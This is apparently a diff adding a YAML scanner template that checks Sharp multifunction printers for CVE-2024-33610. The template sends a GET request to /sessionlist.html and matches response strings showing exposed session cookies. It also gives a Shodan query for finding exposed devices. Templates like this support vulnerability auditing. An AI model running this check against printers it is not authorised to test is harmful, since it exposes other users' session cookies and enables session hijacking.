@@ -1,0 +1,18 @@
+id: poc-yaml-sharp-multifunction-printers-cookie-exposure
+info:
+  name: Sharp 多功能打印机 Cookie泄露漏洞(CVE-2024-33610)
+  severity: medium
+  tags:
+  - CVE-2024-33610
+  - 信息泄露
+  finger: sharp-multifunction-printers
+  shodan: 'Set-Cookie: MFPSESSIONID='
+requests:
+- method: GET
+  path: /sessionlist.html
+  expression: "status_code == 200 && \ncontains(body,\"No.\") &&\ncontains(body,\"\
+    User\") &&\ncontains(body,\"Session List\") &&\ncontains(body,\"Language ID\"\
+    ) &&\ncontains(body,\"Last login\") &&\ncontains(body,\"Last access\") &&\ncontains(body,\"\
+    Cookie\") &&\ncontains(headers,\"Set-Cookie: MFPSESSIONID=\")\n"
+variables: {}
+transport: http
